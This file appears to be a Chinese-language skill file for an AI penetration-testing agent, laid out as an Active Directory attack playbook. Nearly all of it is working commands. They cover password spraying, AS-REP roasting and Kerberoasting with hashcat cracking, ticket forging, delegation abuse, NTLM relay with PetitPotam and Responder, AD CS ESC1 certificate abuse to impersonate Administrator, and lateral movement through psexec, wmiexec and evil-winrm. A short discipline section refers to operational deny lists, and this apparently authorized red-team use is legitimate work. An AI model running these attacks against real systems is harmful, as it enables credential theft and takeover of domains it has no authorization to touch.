---
name: ad-and-internal-identity
description: 内网与域环境（Active Directory / Kerberos / SMB / LDAP / WinRM / 委派 / 证书服务 / NTLM relay 与横向）。当意图涉及"域""Kerberos""打域控""smb""内网主机""提权到域管"时读本 skill。
---
# 域与内网身份 Playbook

> 前提：容器在代理 TUN 后面，**直连内网不可信**。所有 SMB/LDAP/Kerberos 操作要么走 SSH 桥回 Kali 宿主，要么通过已建立的应用层隧道（见 `credential-and-pivot-ops`）。

## 0. 先判环境

```bash
# 我是谁、在哪个域
kx nxc smb TARGET                      # 无凭据先看签名/域信息
kx enum4linux-ng -A TARGET             # 用户/组/共享/SID
kx ldapsearch -x -H ldap://TARGET -s base namingcontexts
kx nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN.LOCAL
```

## 1. 无凭据阶段的三个高价值动作

| 动作 | 命令 | 拿到什么 |
|---|---|---|
| **SMB 空会话/共享** | `kx nxc smb TARGET -u '' -p '' --shares` | 可读共享、敏感文件 |
| **LDAP 匿名绑定** | `kx ldapsearch -x -H ldap://DC -b "dc=corp,dc=local"` | 用户名、组、描述字段（常泄露口令） |
| **AS-REP Roasting（无凭据）** | `kx impacket-GetNPUsers DOMAIN/ -dc-ip DC -usersfile users.txt -no-pass` | 免预认证账号的哈希 → 离线破解 |

## 2. 拿到一个普通账号之后

```bash
# ① 口令喷洒（先试，别急着打）
kx nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success

# ② 枚举面
kx nxc smb DC -u USER -p PASS --shares --users --groups --pass-pol
kx nxc ldap DC -u USER -p PASS --bloodhound --collection All   # 收集 AD 关系

# ③ 找可写的 ACL / 委派 / 无约束主机（BloodHound 图判断，别肉眼猜）
#    关键边：GenericAll / WriteDACL / ForceChangePassword / AddMember / AllowedToAct
```

## 3. Kerberos 攻击（有账号后）

```bash
# Kerberoasting：找带 SPN 的账号，取 TGS，离线破解
kx impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC -request

# AS-REP Roasting（对免预认证账号）
kx impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC -request

# 破解（用 hashcat）
hashcat -m 13100 kerberoast.txt rockyou.txt      # TGS-REP (etype 23)
hashcat -m 18200 asrep.txt rockyou.txt           # AS-REP

# 票据
kx impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAIN user
export KRB5CCNAME=user.ccache

# 委派
kx impacket-getST -spn cifs/target.corp.local -impersonate Administrator DOMAIN/svc:PASS
kx impacket-findDelegation DOMAIN/USER:PASS -dc-ip DC
```

## 4. NTLM Relay 与强制认证

```bash
# 中继（需先关闭 SMB 签名）
kx nxc smb hosts.txt --gen-relay-list relay.txt
kx impacket-ntlmrelayx -tf relay.txt -smb2support -i
# 强制认证（把 DC/主机的认证拉到自己这）
kx impacket-PetitPotam.py ATTACKER DC_IP
kx responder -I eth0 -wv            # 抓 NTLMv2 → hashcat -m 5600
```

## 5. AD CS（证书服务，最容易直接打到域管）

```bash
kx certipy find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable
# ESC1：模板允许请求方自定 SAN → 以 Administrator 身份申请
kx certipy req -u USER@DOMAIN -p PASS -ca CA -template VulnTemplate -upn administrator@domain
kx certipy auth -pfx administrator.pfx -dc-ip DC
# ESC8：证书服务 HTTP 端点可被 NTLM relay → 中继到 /certsrv
```

## 6. 横向执行

```bash
kx nxc smb TARGET -u USER -p PASS -x 'whoami'          # 远控执行
kx impacket-psexec DOMAIN/USER:PASS@TARGET
kx impacket-wmiexec DOMAIN/USER:PASS@TARGET
kx impacket-atexec  DOMAIN/USER:PASS@TARGET 'whoami'
kx evil-winrm -i TARGET -u USER -p PASS                 # WinRM
```

## 7. 本机提权（Linux / Windows 快速清单）

```bash
# Linux
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers
# 内核版本 → 已知 exp（慎用，容易打崩）
uname -a; cat /etc/os-release

# Windows
whoami /priv; whoami /groups; systeminfo
# 关注 SeImpersonate / SeAssignPrimaryToken → PrintSpoofer / GodPotato
# 服务路径可写、AlwaysInstallElevated、未引号服务路径
```

## 8. 纪律

- **不要一上来就打域控**：先铺资产（主机清单、开放服务、凭据矩阵），再选最短路径。
- 每条凭据命中立刻记 fact（主机/服务/权限），避免重复劳动。
- 票据与密码**不写进 finding 的公开字段**，写到 run 目录并在 finding 里引用路径。
- 破坏性动作（改 GPO、删账号、装服务）前先确认这不在操作约束的 deny 列表里；无约束时也要评估是否会打断后续测试。
